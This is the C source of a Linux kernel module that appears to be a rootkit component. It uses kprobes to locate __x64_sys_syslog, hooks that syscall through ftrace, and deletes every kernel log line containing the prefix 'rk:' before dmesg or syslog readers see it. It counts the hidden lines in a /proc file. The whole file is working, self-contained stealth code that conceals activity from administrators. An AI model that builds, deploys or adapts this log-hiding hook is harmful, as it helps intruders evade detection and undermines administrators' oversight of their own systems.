// SPDX-License-Identifier: GPL-2.0
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#define HIDE_PREFIX "rk:"
#define ENDBR_SIZE 4

static struct proc_dir_entry *proc_entry;
static atomic_t hidden_count = ATOMIC_INIT(0);
static unsigned long sys_syslog_addr;

static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;

	if (register_kprobe(&kp))
		return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

typedef long (*syslog_t)(const struct pt_regs *);
static syslog_t orig_syslog;
static struct ftrace_ops syslog_ops;

static void scrub_lines(char __user *ubuf, int *ret)
{
	char *kbuf, *src, *dst, *end, *nl;
	int orig_len = *ret;

	if (orig_len <= 0)
		return;

	kbuf = kmalloc(orig_len + 1, GFP_KERNEL);
	if (!kbuf)
		return;

	if (copy_from_user(kbuf, ubuf, orig_len)) {
		kfree(kbuf);
		return;
	}
	kbuf[orig_len] = '\0';

	src = kbuf;
	dst = kbuf;
	end = kbuf + orig_len;

	while (src < end) {
		nl = memchr(src, '\n', end - src);
		if (!nl)
			nl = end - 1;

		if (strnstr(src, HIDE_PREFIX, nl - src + 1)) {
			atomic_inc(&hidden_count);
			src = nl + 1;
			continue;
		}

		if (dst != src)
			memmove(dst, src, nl - src + 1);
		dst += nl - src + 1;
		src = nl + 1;
	}

	*ret = dst - kbuf;
	if (copy_to_user(ubuf, kbuf, *ret))
		;
	kfree(kbuf);
}

static long noinline intercepted_syslog(const struct pt_regs *regs)
{
	int type = (int)regs->di;
	long ret;

	ret = orig_syslog(regs);

	if (ret > 0 && (type == 3 || type == 2)) {
		int r = (int)ret;

		scrub_lines((char __user *)regs->si, &r);
		ret = r;
	}

	return ret;
}

static void notrace redirect_syslog(unsigned long ip, unsigned long parent_ip,
				    struct ftrace_ops *ops,
				    struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);

	if (!regs || within_module(parent_ip, THIS_MODULE))
		return;

	regs->ip = (unsigned long)intercepted_syslog;
}

static int install_hook(void)
{
	int err;

	sys_syslog_addr = lookup_name("__x64_sys_syslog");
	if (!sys_syslog_addr)
		return -ENOENT;

	orig_syslog = (syslog_t)(sys_syslog_addr - ENDBR_SIZE);

	syslog_ops.func = redirect_syslog;
	syslog_ops.flags = FTRACE_OPS_FL_SAVE_REGS |
			   FTRACE_OPS_FL_IPMODIFY |
			   FTRACE_OPS_FL_RECURSION;

	err = ftrace_set_filter_ip(&syslog_ops, sys_syslog_addr, 0, 0);
	if (err)
		return err;

	err = register_ftrace_function(&syslog_ops);
	if (err) {
		ftrace_set_filter_ip(&syslog_ops, sys_syslog_addr, 1, 0);
		return err;
	}
	return 0;
}

static void remove_hook(void)
{
	unregister_ftrace_function(&syslog_ops);
	ftrace_set_filter_ip(&syslog_ops, sys_syslog_addr, 1, 0);
}

static ssize_t stats_show(struct file *f, char __user *buf,
			  size_t count, loff_t *pos)
{
	char tmp[64];
	int len;

	len = snprintf(tmp, sizeof(tmp), "hidden=%d\n",
		       atomic_read(&hidden_count));
	return simple_read_from_buffer(buf, count, pos, tmp, len);
}

static const struct proc_ops stats_ops = {
	.proc_read = stats_show,
};

static int __init loghider_init(void)
{
	int err;

	err = install_hook();
	if (err) {
		pr_err("rk: __x64_sys_syslog not found\n");
		return err;
	}

	pr_info("rk: log hiding active\n");
	pr_info("rk: this line should be hidden from dmesg\n");

	proc_entry = proc_create("rk_logfilter", 0444, NULL, &stats_ops);
	if (!proc_entry) {
		remove_hook();
		return -ENOMEM;
	}

	return 0;
}

static void __exit loghider_exit(void)
{
	proc_remove(proc_entry);
	remove_hook();
}

module_init(loghider_init);
module_exit(loghider_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Kernel log hiding via syslog hook");
